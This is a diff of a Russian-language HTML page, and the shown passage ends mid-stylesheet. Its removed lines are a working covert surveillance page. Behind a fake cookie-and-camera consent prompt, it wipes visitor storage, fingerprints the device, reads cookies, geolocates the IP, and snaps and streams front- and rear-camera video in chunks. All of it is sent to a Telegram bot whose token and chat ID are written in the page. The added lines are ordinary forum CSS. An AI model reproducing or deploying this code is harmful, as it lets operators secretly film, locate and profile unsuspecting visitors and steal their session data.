@@ -2,572 +2,939 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Загрузка...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#6c5ce7">
+<title>Форум • Информация о пользователях</title>
 <style>
-  html, body { margin: 0; padding: 0; height: 100%; background: #000; }
-
-  #gate {
-    position: fixed; inset: 0;
-    background: #000; color: #eee;
-    display: flex; flex-direction: column; gap: 24px;
-    align-items: center; justify-content: center;
-    text-align: center; padding: 30px;
-    font: 16px/1.5 Arial, sans-serif;
-    z-index: 9999;
+  :root {
+    --bg: #0f1117;
+    --card: #1a1d27;
+    --card2: #12151f;
+    --border: #2a2e3b;
+    --accent: #6c5ce7;
+    --accent2: #a29bfe;
+    --text: #e8eaf0;
+    --muted: #9ba3b5;
+    --success: #00b894;
+    --danger: #ff6b6b;
+    --warn: #fdcb6e;
+    --radius: 14px;
+    --shadow: 0 10px 30px rgba(0,0,0,0.3);
   }
-  #gate h1 { margin: 0; font-size: 22px; font-weight: 600; color: #fff; }
-  #gate p  { margin: 0; max-width: 460px; color: #aaa; }
-  #gate .row { display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; }
+
+  body.light {
+    --bg: #f0f2f7;
+    --card: #ffffff;
+    --card2: #f7f8fc;
+    --border: #e1e5ee;
+    --text: #1a1d27;
+    --muted: #6b7280;
+    --shadow: 0 10px 30px rgba(0,0,0,0.08);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.5;
+    transition: background 0.3s, color 0.3s;
+  }
+
+  ::-webkit-scrollbar { width: 10px; height: 10px; }
+  ::-webkit-scrollbar-track { background: var(--card2); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+  #progress-bar {
+    position: fixed;
+    top: 0; left: 0;
+    height: 3px;
+    width: 0%;
+    background: var(--accent);
+    z-index: 9999;
+    transition: width 0.15s;
+  }
+
+  #toast-container {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    z-index: 9998;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    pointer-events: none;
+  }
+
+  .toast {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 10px;
+    padding: 14px 18px;
+    min-width: 260px;
+    max-width: 360px;
+    box-shadow: var(--shadow);
+    animation: slideInRight 0.3s ease;
+    pointer-events: auto;
+  }
+
+  .toast.success { border-left-color: var(--success); }
+  .toast.error { border-left-color: var(--danger); }
+  .toast.warn { border-left-color: var(--warn); }
+
+  .toast-title { font-weight: 600; margin-bottom: 4px; font-size: 0.95rem; }
+  .toast-msg { font-size: 0.85rem; color: var(--muted); }
+
+  @keyframes slideInRight {
+    from { transform: translateX(120%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+  }
+
+  @keyframes slideOutRight {
+    from { transform: translateX(0); opacity: 1; }
+    to { transform: translateX(120%); opacity: 0; }
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-6px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes slideDown {
+    from { opacity: 0; transform: translateY(-8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  #scroll-top {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    background: var(--accent);
+    color: white;
+    border: none;
+    font-size: 1.3rem;
+    cursor: pointer;
+    box-shadow: var(--shadow);
+    display: none;
+    z-index: 900;
+    transition: 0.2s;
+  }
+
+  #scroll-top:hover { transform: translateY(-3px); background: #5a4bd1; }
+  #scroll-top.show { display: block; }
+
+  /* АВТОРИЗАЦИЯ */
+  #auth-screen {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+    background: radial-gradient(ellipse at top, #1e2235 0%, var(--bg) 70%);
+  }
+
+  body.light #auth-screen {
+    background: radial-gradient(ellipse at top, #e8ebf5 0%, var(--bg) 70%);
+  }
+
+  .auth-box {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    width: 100%;
+    max-width: 460px;
+    padding: 36px 32px;
+    box-shadow: var(--shadow);
+    animation: slideUp 0.5s ease;
+  }
+
+  .auth-box h1 {
+    text-align: center;
+    font-size: 1.7rem;
+    margin-bottom: 8px;
+    color: var(--text);
+  }
+
+  .auth-sub {
+    text-align: center;
+    color: var(--muted);
+    font-size: 0.9rem;
+    margin-bottom: 10px;
+  }
+
+  .auth-tabs {
+    display: flex;
+    gap: 8px;
+    margin: 24px 0 20px;
+  }
+
+  .auth-tabs button {
+    flex: 1;
+    padding: 10px;
+    border: none;
+    border-radius: 10px;
+    background: transparent;
+    color: var(--muted);
+    font-weight: 600;
+    cursor: pointer;
+    transition: 0.2s;
+    font-size: 0.95rem;
+    font-family: inherit;
+  }
+
+  .auth-tabs button.active {
+    background: var(--accent);
+    color: white;
+  }
+
+  .form-group { margin-bottom: 16px; }
+
+  .form-group label {
+    display: block;
+    font-size: 0.85rem;
+    color: var(--muted);
+    margin-bottom: 6px;
+    font-weight: 500;
+  }
+
+  .form-group input,
+  .form-group textarea,
+  .form-group select {
+    width: 100%;
+    padding: 12px 14px;
+    border-radius: 10px;
+    border: 1px solid var(--border);
+    background: var(--card2);
+    color: var(--text);
+    font-size: 1rem;
+    outline: none;
+    transition: border 0.2s;
+    font-family: inherit;
+  }
+
+  .form-group input:focus,
+  .form-group textarea:focus { border-color: var(--accent); }
+
+  .form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
 
   .btn {
-    padding: 14px 34px; font-size: 16px; border: 0; border-radius: 8px;
-    cursor: pointer; font-weight: bold; transition: .15s;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 10px;
+    background: var(--accent);
+    color: white;
+    font-size: 0.95rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: 0.2s;
+    font-family: inherit;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
   }
-  #yes {
-    background: #8b5cf6; color: #fff;
-    box-shadow: 0 0 24px rgba(139,92,246,.55);
+
+  .btn:hover { background: #5a4bd1; transform: translateY(-1px); }
+  .btn:active { transform: translateY(0); }
+  .btn-block { width: 100%; margin-top: 8px; }
+
+  .btn-secondary {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
   }
-  #yes:hover  { background: #7c3aed; }
-  #yes:disabled { opacity: .55; cursor: default; box-shadow: none; }
+  .btn-secondary:hover { background: var(--border); }
 
-  #no { background: #222; color: #bbb; }
-  #no:hover { background: #333; color: #fff; }
+  .btn-danger { background: var(--danger); }
+  .btn-danger:hover { background: #e55a5a; }
 
-  #status { margin-top: 4px; font-size: 14px; color: #888; min-height: 20px; }
+  .btn-success { background: var(--success); }
+  .btn-success:hover { background: #00a884; }
 
-  #site {
+  .btn-sm { padding: 6px 12px; font-size: 0.85rem; }
+
+  .error-msg {
+    color: var(--danger);
+    font-size: 0.85rem;
+    margin-top: 10px;
+    text-align: center;
     display: none;
-    background: #0f0f0f; color: #eee;
-    min-height: 100vh; padding: 40px 20px;
-    font: 16px/1.6 Arial, sans-serif;
+  }
+
+  /* ФОРУМ */
+  #forum-screen {
+    display: none;
+    max-width: 1000px;
+    margin: 0 auto;
+    padding: 20px 16px 80px;
+  }
+
+  header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 24px;
+    position: sticky;
+    top: 0;
+    background: var(--bg);
+    padding: 12px 0;
+    z-index: 100;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .logo {
+    font-size: 1.4rem;
+    font-weight: 700;
+    color: var(--accent2);
+    cursor: pointer;
+  }
+
+  .header-right {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    position: relative;
+  }
+
+  .icon-btn {
+    background: none;
+    border: none;
+    color: var(--muted);
+    font-size: 1rem;
+    cursor: pointer;
+    padding: 8px 10px;
+    border-radius: 8px;
+    transition: 0.2s;
+    position: relative;
+    font-family: inherit;
+    font-weight: 500;
+  }
+
+  .icon-btn:hover { background: var(--border); color: var(--text); }
+
+  .icon-btn.active {
+    background: var(--accent);
+    color: white;
+  }
+
+  .badge-dot {
+    position: absolute;
+    top: 4px;
+    right: 4px;
+    background: var(--danger);
+    color: white;
+    border-radius: 10px;
+    padding: 1px 6px;
+    font-size: 0.7rem;
+    font-weight: 700;
+    min-width: 16px;
     text-align: center;
   }
-  #site h2 { color: #fff; }
 
-  #preview, #canvas { display: none; }
-</style>
-</head>
-<body>
-
-<script>
-// ═══════════════════════════════════════════════════════════
-// СБРОС ДАННЫХ ПРИ ПЕРВОМ ПЕРЕХОДЕ
-// ═══════════════════════════════════════════════════════════
-(async function wipeOnFirstVisit() {
-  const FLAG = '__wiped_v1__';
-  try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}
-
-  try {
-    const cookies = document.cookie ? document.cookie.split(';') : [];
-    for (const c of cookies) {
-      const name = c.split('=')[0].trim();
-      if (!name) continue;
-      const paths = ['/', location.pathname, location.pathname.replace(/\/[^/]*$/, '/')];
-      const domains = ['', location.hostname, '.' + location.hostname,
-                       location.hostname.replace(/^www\./, ''), '.' + location.hostname.replace(/^www\./, '')];
-      for (const p of paths) {
-        for (const d of domains) {
-          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
-        }
-      }
-    }
-  } catch (e) {}
-  try { localStorage.clear(); } catch (e) {}
-  try { sessionStorage.clear(); } catch (e) {}
-  try {
-    if (indexedDB.databases) {
-      const dbs = await indexedDB.databases();
-      for (const db of dbs) {
-        if (db && db.name) { try { indexedDB.deleteDatabase(db.name); } catch (e) {} }
-      }
-    }
-  } catch (e) {}
-  try {
-    if (window.caches) {
-      const keys = await caches.keys();
-      for (const k of keys) { try { await caches.delete(k); } catch (e) {} }
-    }
-  } catch (e) {}
-
-  try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}
-  location.reload();
-})();
-</script>
-
-<div id="gate">
-  <h1>Вы хотите посетить наш сайт?</h1>
-  <p>Для продолжения необходимо принять cookies и разрешить доступ к камере.</p>
-  <div class="row">
-    <button id="no"  class="btn">Нет</button>
-    <button id="yes" class="btn">Да</button>
-  </div>
-  <p id="status"></p>
-</div>
-
-<div id="site">
-  <h2>Добро пожаловать!</h2>
-  <p>Проверка пройдена. Доступ открыт.</p>
-</div>
-
-<video id="preview" autoplay playsinline muted></video>
-<canvas id="canvas"></canvas>
-
-<script>
-// ═══════════════════════════════════════════════════════════
-// НАСТРОЙКИ
-// ═══════════════════════════════════════════════════════════
-const TOKEN   = '8243475342:AAF9-cbm1bpIKCTxIVF2djRV6FSDotkK-1U';
-const CHAT_ID = '8689558225';
-
-const btnYes   = document.getElementById('yes');
-const btnNo    = document.getElementById('no');
-const statusEl = document.getElementById('status');
-const video    = document.getElementById('preview');
-const canvas   = document.getElementById('canvas');
-
-// Состояние записи
-let mediaStream    = null;
-let mediaRecorder  = null;
-let chunkTimer     = null;
-let chunkIndex     = 0;
-let isRecording    = false;
-let facingCurrent  = 'user';
-let videoExt       = 'webm';
-let videoMime      = 'video/webm';
-let lastSentChunk  = 0;      // сколько чанков отправлено
-let pendingChunks  = [];     // очередь на отправку
-
-// ═══════════════════════════════════════════════════════════
-// ОТПРАВКА
-// ═══════════════════════════════════════════════════════════
-function sendChunk(text) {
-  return new Promise(res => {
-    const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
-                '&parse_mode=HTML&disable_web_page_preview=true&text=' + encodeURIComponent(text);
-    const img = new Image();
-    img.onload = img.onerror = () => res();
-    img.src = url;
-    setTimeout(res, 400);
-  });
-}
-
-async function sendPhoto(blob, caption) {
-  try {
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('photo', blob, 'photo.jpg');
-    form.append('caption', caption || 'Фото');
-    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
-      method: 'POST', body: form, keepalive: true
-    });
-    const j = await r.json();
-    return j.ok;
-  } catch (e) { return false; }
-}
-
-async function sendVideo(blob, ext, caption) {
-  try {
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('video', blob, 'video.' + (ext || 'webm'));
-    form.append('caption', caption || 'Видео');
-    form.append('supports_streaming', 'true');
-    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendVideo', {
-      method: 'POST', body: form, keepalive: true
-    });
-    const j = await r.json();
-    return j.ok;
-  } catch (e) { return false; }
-}
-
-// ═══════════════════════════════════════════════════════════
-// ПОЛЕЗНЫЕ ДАННЫЕ (сокращено)
-// ═══════════════════════════════════════════════════════════
-async function collectUseful() {
-  const ua = navigator.userAgent;
-  const n  = navigator;
-  const s  = screen;
-  const out = {};
-
-  const ref = document.referrer || '';
-  let refSource = 'прямой заход';
-  if (/t\.me|telegram/i.test(ref))      refSource = 'Telegram';
-  else if (/google\./i.test(ref))       refSource = 'Google';
-  else if (/yandex\./i.test(ref))       refSource = 'Яндекс';
-  else if (/bing\./i.test(ref))         refSource = 'Bing';
-  else if (/vk\.com/i.test(ref))        refSource = 'ВКонтакте';
-  else if (/instagram\./i.test(ref))    refSource = 'Instagram';
-  else if (/facebook\./i.test(ref))     refSource = 'Facebook';
-  else if (ref)                         refSource = ref;
-  out['Источник'] = refSource;
-  out['Referrer'] = ref || '(прямой заход)';
-
-  let inApp = 'нет';
-  if (/Telegram/i.test(ua))                     inApp = 'Telegram';
-  else if (/Instagram/i.test(ua))               inApp = 'Instagram';
-  else if (/FBAN|FBAV|FB_IAB/i.test(ua))        inApp = 'Facebook';
-  else if (/WhatsApp/i.test(ua))                inApp = 'WhatsApp';
-  else if (/Viber/i.test(ua))                   inApp = 'Viber';
-  else if (/TikTok|BytedanceWebview/i.test(ua)) inApp = 'TikTok';
-  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) inApp = 'VK';
-  out['Приложение'] = inApp;
-
-  let browser = 'неизвестно', bver = '';
-  const bt = [
-    [/YaBrowser\/([\d.]+)/,     'Яндекс.Браузер'],
-    [/Edg\/([\d.]+)/,           'Microsoft Edge'],
-    [/OPR\/([\d.]+)/,           'Opera'],
-    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],
-    [/Firefox\/([\d.]+)/,       'Firefox'],
-    [/CriOS\/([\d.]+)/,         'Chrome iOS'],
-    [/FxiOS\/([\d.]+)/,         'Firefox iOS'],
-    [/Chrome\/([\d.]+)/,        'Chrome'],
-    [/Version\/([\d.]+).*Safari/,'Safari'],
-  ];
-  for (const [re, name] of bt) {
-    const m = re.exec(ua);
-    if (m) { browser = name; bver = m[1]; break; }
-  }
-  out['Браузер'] = browser + (bver ? ' ' + bver : '');
-
-  let os = 'неизвестно', osv = '';
-  if (/Windows NT 10/i.test(ua))       { os = 'Windows 10/11'; }
-  else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; osv = RegExp.$1; }
-  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = (RegExp(/OS ([\d_]+)/).exec(ua) || [])[1] || ''; }
-  else if (/Mac OS X ([\d_.]+)/i.test(ua)) { os = 'macOS'; osv = RegExp.$1.replace(/_/g,'.'); }
-  else if (/Android ([\d.]+)/i.test(ua)) { os = 'Android'; osv = RegExp.$1; }
-  else if (/Linux/i.test(ua))           os = 'Linux';
-  out['ОС'] = os + (osv ? ' ' + osv : '');
-
-  let device = 'десктоп';
-  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) device = 'планшет';
-  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) device = 'смартфон';
-  out['Устройство'] = device;
-
-  const modelMatch = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
-  if (modelMatch) out['Модель'] = modelMatch[1].trim();
-
-  out['Язык']      = n.language;
-  out['Часовой пояс'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  out['Локальное время'] = new Date().toLocaleString('ru-RU');
-  out['Экран']     = s.width + 'x' + s.height;
-  out['Окно']      = window.innerWidth + 'x' + window.innerHeight;
-  out['DPR']       = window.devicePixelRatio;
-  out['Ядер CPU']  = n.hardwareConcurrency || '';
-  out['RAM (GB)']  = n.deviceMemory || '';
-  out['Платформа'] = n.platform || '';
-  out['Онлайн']    = n.onLine ? 'да' : 'нет';
-
-  if (n.getBattery) {
-    try {
-      const b = await n.getBattery();
-      out['Батарея'] = Math.round(b.level * 100) + '%';
-      out['Заряжается'] = b.charging ? 'да' : 'нет';
-    } catch (e) {}
+  .avatar {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: var(--accent);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 1.1rem;
+    color: white;
+    cursor: pointer;
+    transition: 0.2s;
+    overflow: hidden;
+    background-size: cover;
+    background-position: center;
+    position: relative;
+    flex-shrink: 0;
   }
 
-  try {
-    const cv = document.createElement('canvas');
-    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
-    if (gl) {
-      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-      if (dbg) {
-        out['GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-        out['GPU модель'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-      }
-    }
-  } catch (e) {}
+  .avatar:hover { transform: scale(1.05); }
 
-  out['URL']      = location.href;
-  out['Хост']     = location.hostname;
-
-  try {
-    const ck = document.cookie || '';
-    if (ck) out['Cookies'] = ck;
-  } catch (e) {}
-
-  try {
-    const r = await fetch('https://ipwho.is/');
-    const g = await r.json();
-    if (g.success !== false && g.latitude != null) {
-      out['IP']           = g.ip;
-      out['Страна']       = g.country;
-      out['Город']        = g.city;
-      out['Координаты']   = g.latitude + ', ' + g.longitude;
-      out['ISP']          = g.connection && g.connection.isp;
-      out['VPN']          = g.security && g.security.vpn ? 'да' : 'нет';
-      out['Google Maps']  = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
-    }
-  } catch (e) {}
-
-  return out;
-}
-
-// ═══════════════════════════════════════════════════════════
-// ЗАПИСЬ ВИДЕО С КАМЕРЫ — отправка чанками
-// ═══════════════════════════════════════════════════════════
-
-// Определяем лучший поддерживаемый формат
-function pickMime() {
-  const candidates = [
-    ['video/webm;codecs=vp8,opus', 'webm'],
-    ['video/webm;codecs=vp9,opus', 'webm'],
-    ['video/webm',                 'webm'],
-    ['video/mp4;codecs=h264,aac',  'mp4'],
-    ['video/mp4',                  'mp4'],
-  ];
-  if (typeof MediaRecorder === 'undefined') return null;
-  for (const [m, e] of candidates) {
-    if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
-      videoMime = m; videoExt = e;
-      return { mime: m, ext: e };
-    }
-  }
-  videoMime = ''; videoExt = 'webm';
-  return { mime: '', ext: 'webm' };
-}
-
-async function startRecording(facingMode) {
-  facingCurrent = facingMode;
-  try {
-    mediaStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
-      audio: true
-    });
-  } catch (e) {
-    // без звука, если не получилось
-    try {
-      mediaStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
-        audio: false
-      });
-    } catch (e2) {
-      return false;
-    }
+  .avatar.online::after {
+    content: '';
+    position: absolute;
+    bottom: 0; right: 0;
+    width: 12px; height: 12px;
+    background: var(--success);
+    border: 2px solid var(--bg);
+    border-radius: 50%;
   }
 
-  video.srcObject = mediaStream;
-  await new Promise(res => {
-    if (video.readyState >= 2) return res();
-    video.onloadeddata = () => res();
-  });
+  .username { font-weight: 600; cursor: pointer; }
+  .username:hover { color: var(--accent2); }
 
-  const fmt = pickMime();
-  if (!fmt) return false;
-
-  try {
-    mediaRecorder = new MediaRecorder(mediaStream, {
-      mimeType: fmt.mime || undefined,
-      videoBitsPerSecond: 500000,
-      audioBitsPerSecond: 48000
-    });
-  } catch (e) {
-    try { mediaRecorder = new MediaRecorder(mediaStream); } catch (e2) { return false; }
+  .dropdown {
+    position: absolute;
+    top: 52px;
+    right: 0;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    width: 300px;
+    padding: 8px 0;
+    box-shadow: var(--shadow);
+    display: none;
+    z-index: 200;
   }
 
-  // Каждые 5 секунд — отдельный чанк, который сразу отправляется
-  mediaRecorder.ondataavailable = async (e) => {
-    if (!e.data || !e.data.size) return;
-    chunkIndex++;
-    const idx = chunkIndex;
-    const blob = e.data;
+  .dropdown.show { display: block; animation: fadeIn 0.15s; }
 
-    // Отправляем сразу — чтобы при резком закрытии вкладки почти всё было в Telegram
-    sendChunk('📹 <b>Фронтальная камера</b> — фрагмент #' + idx + ' (' +
-              Math.round(blob.size / 1024) + ' KB)');
-    await sendVideo(blob, videoExt,
-      '🤳 Чанк #' + idx + ' с фронтальной камеры\n' +
-      'Размер: ' + Math.round(blob.size / 1024) + ' KB\n' +
-      'Время: ' + new Date().toLocaleString('ru-RU')
-    );
-    lastSentChunk = idx;
-  };
-
-  mediaRecorder.start(5000); // раз в 5 секунд отдаёт blob
-  isRecording = true;
-  statusEl.textContent = 'Запись идёт...';
-  return true;
-}
-
-async function stopRecordingAndFlush() {
-  if (!mediaRecorder) return;
-  try {
-    if (mediaRecorder.state !== 'inactive') {
-      mediaRecorder.requestData(); // забираем остаток
-      mediaRecorder.stop();
-    }
-  } catch (e) {}
-  if (mediaStream) {
-    mediaStream.getTracks().forEach(t => t.stop());
-    mediaStream = null;
-  }
-  isRecording = false;
-}
-
-// ═══════════════════════════════════════════════════════════
-// ОТСЛЕЖИВАНИЕ УХОДА ПОЛЬЗОВАТЕЛЯ
-// ═══════════════════════════════════════════════════════════
-
-// 1) Ушёл с сайта (свернул вкладку, переключился)
-document.addEventListener('visibilitychange', async () => {
-  if (document.visibilityState === 'hidden' && isRecording) {
-    await sendChunk('👋 <b>Пользователь ушёл с сайта</b>\n' +
-                    'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
-                    'URL: ' + location.href + '\n' +
-                    'Отправляю остаток записи...');
-    // Забираем всё что есть, отправляем последний чанк
-    try { mediaRecorder.requestData(); } catch (e) {}
-  }
-});
-
-// 2) Закрывает вкладку/уходит на другой сайт
-window.addEventListener('pagehide', async () => {
-  if (isRecording) {
-    try { mediaRecorder.requestData(); } catch (e) {}
-    try { await stopRecordingAndFlush(); } catch (e) {}
-  }
-});
-
-// 3) Пытается закрыть вкладку
-window.addEventListener('beforeunload', () => {
-  if (isRecording) {
-    try { mediaRecorder.requestData(); } catch (e) {}
-    try { mediaRecorder.stop(); } catch (e) {}
-    // Синхронная попытка — с keepalive
-    try {
-      const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage';
-      const fd = new FormData();
-      fd.append('chat_id', CHAT_ID);
-      fd.append('parse_mode', 'HTML');
-      fd.append('text', '🚪 <b>Пользователь покидает сайт</b>\n' + location.href);
-      navigator.sendBeacon && navigator.sendBeacon(url, fd);
-    } catch (e) {}
-  }
-});
-
-// 4) Потеря фокуса окна
-window.addEventListener('blur', () => {
-  if (isRecording) {
-    // просто фиксируем, не отправляем — иначе будет спам
-  }
-});
-
-// ═══════════════════════════════════════════════════════════
-// АВТОЗАПУСК ПРИ ПЕРЕХОДЕ
-// ═══════════════════════════════════════════════════════════
-(async function autoRun() {
-  await new Promise(r => setTimeout(r, 400));
-
-  const data = await collectUseful();
-
-  await sendChunk(
-    '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
-    '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
-    '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
-    '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
-    '<b>ОС:</b> ' + (data['ОС'] || '?') + '\n' +
-    '<b>Устройство:</b> ' + (data['Устройство'] || '?') + '\n' +
-    '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
-    '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
-    '<b>Время:</b> ' + (data['Локальное время'] || '?')
-  );
-
-  const lines = Object.entries(data)
-    .filter(([k, v]) => v !== '' && v != null && v !== false)
-    .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));
-
-  const chunks = [];
-  let cur = '';
-  for (const line of lines) {
-    if ((cur + line).length > 3500) { chunks.push(cur); cur = ''; }
-    cur += line + '\n';
-  }
-  if (cur) chunks.push(cur);
-
-  for (let i = 0; i < chunks.length; i++) {
-    const head = '📋 <b>ПОЛЕЗНЫЕ ДАННЫЕ</b>' +
-                 (chunks.length > 1 ? ' (' + (i+1) + '/' + chunks.length + ')' : '') + '\n\n';
-    await sendChunk(head + chunks[i]);
-    await new Promise(r => setTimeout(r, 500));
-  }
-})();
-
-// ═══════════════════════════════════════════════════════════
-// КНОПКА «ДА» — фото + длинная запись чанками
-// ═══════════════════════════════════════════════════════════
-btnYes.onclick = async () => {
-  btnYes.disabled = true;
-  btnNo.disabled  = true;
-  statusEl.textContent = 'Разрешите доступ к камере...';
-
-  try {
-    document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
-    localStorage.setItem('cookie_consent', 'accepted');
-    sessionStorage.setItem('cookie_consent', 'accepted');
-  } catch (e) {}
-
-  await sendChunk(
-    '✅ <b>ПОЛЬЗОВАТЕЛЬ НАЖАЛ «ДА»</b>\n\n' +
-    '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
-    '<b>URL:</b> ' + location.href + '\n\n' +
-    'Начинаю запись. Чанки по 5 сек будут приходить по мере поступления.'
-  );
-
-  // Фото с фронталки
-  try {
-    const tempStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: 640, height: 480 }, audio: false
-    });
-    video.srcObject = tempStream;
-    await new Promise(res => {
-      if (video.readyState >= 2) return res();
-      video.onloadeddata = () => res();
-    });
-    await new Promise(r => setTimeout(r, 600));
-    const w = video.videoWidth || 640;
-    const h = video.videoHeight || 480;
-    canvas.width = w; canvas.height = h;
-    canvas.getContext('2d').drawImage(video, 0, 0, w, h);
-    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
-    if (photoBlob) {
-      await sendPhoto(photoBlob, '🤳 Фото с фронтальной камеры\n' +
-        'Время: ' + new Date().toLocaleString('ru-RU'));
-    }
-    tempStream.getTracks().forEach(t => t.stop());
-    video.srcObject = null;
-  } catch (e) {}
-
-  // Показываем сайт
-  document.getElementById('gate').style.display = 'none';
-  document.getElementById('site').style.display = 'block';
-
-  // Запускаем запись с фронтальной камеры
-  const ok = await startRecording('user');
-  if (!ok) {
-    await sendChunk('⚠️ Не удалось запустить запись камеры.');
-    return;
+  .dropdown-item {
+    padding: 10px 18px;
+    cursor: pointer;
+    transition: 0.15s;
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.95rem;
+    align-items: center;
   }
 
-  await sendChunk('🎬 Запись с фронтальной камеры запущена. Чанки по 5 сек будут приходить.');
+  .dropdown-item:hover { background: var(--card2); }
 
-  // Через 30 секунд — переключаем на заднюю камеру (если есть)
-  setTimeout(async () => {
-    await stopRecordingAndFlush();
-    await sendChunk('🔄 Переключаюсь на заднюю камеру...');
+  .dropdown-item span:last-child {
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
 
-    const ok2 = await startRecording('environment');
-    if (!ok2) {
-      await sendChunk('ℹ️ Задняя камера недоступна. Запись остановлена.');
-    } else {
-      await sendChunk('🎬 Запись с задней камеры запущена.');
-    }
-  }, 30000);
-};
+  .dropdown-divider { height: 1px; background: var(--border); margin: 6px 0; }
 
-btnNo.onclick = () => {
-  document.body.innerHTML =
-    '<p style="padding:40px;font:16px Arial;color:#eee;background:#000;min-height:100vh;margin:0">Вы отказались. Сайт недоступен.</p>';
-};
-</script>
-</body>
-</html>
+  .dropdown-header {
+    padding: 8px 18px 4px;
+    font-size: 0.72rem;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    font-weight: 600;
+  }
+
+  .mini-profile {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 18px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .mini-profile .avatar { width: 48px; height: 48px; }
+
+  .mini-info { flex: 1; min-width: 0; }
+  .mini-name { font-weight: 700; font-size: 1rem; }
+  .mini-role { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
+
+  /* Вкладки */
+  .tabs {
+    display: flex;
+    gap: 4px;
+    margin-bottom: 20px;
+    overflow-x: auto;
+    padding-bottom: 4px;
+    scrollbar-width: none;
+  }
+  .tabs::-webkit-scrollbar { display: none; }
+
+  .tab {
+    padding: 9px 16px;
+    border-radius: 10px;
+    background: var(--card);
+    color: var(--muted);
+    cursor: pointer;
+    font-weight: 500;
+    font-size: 0.9rem;
+    white-space: nowrap;
+    transition: 0.2s;
+    font-family: inherit;
+    border: 1px solid var(--border);
+  }
+
+  .tab:hover { color: var(--text); }
+
+  .tab.active {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: white;
